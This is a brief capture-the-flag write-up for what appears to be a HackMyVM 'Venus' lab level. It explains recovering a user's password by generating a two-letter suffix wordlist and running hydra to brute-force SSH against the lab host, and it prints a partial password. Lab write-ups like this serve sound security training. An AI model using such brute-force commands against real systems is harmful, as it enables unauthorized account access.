Mission
	The user gloria has forgotten the last 2 characters of her
	password ... They only remember that they were 2 lowercase letters. 
Method of solving
	Create a custom password list, then bruteforce an SSH login for the
	gloria user
Key command
	for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i"; done >
	passwords.txt hydra -V -t 32 -l gloria -P passwords.txt ssh://
	venus.hackmyvm.eu:5000
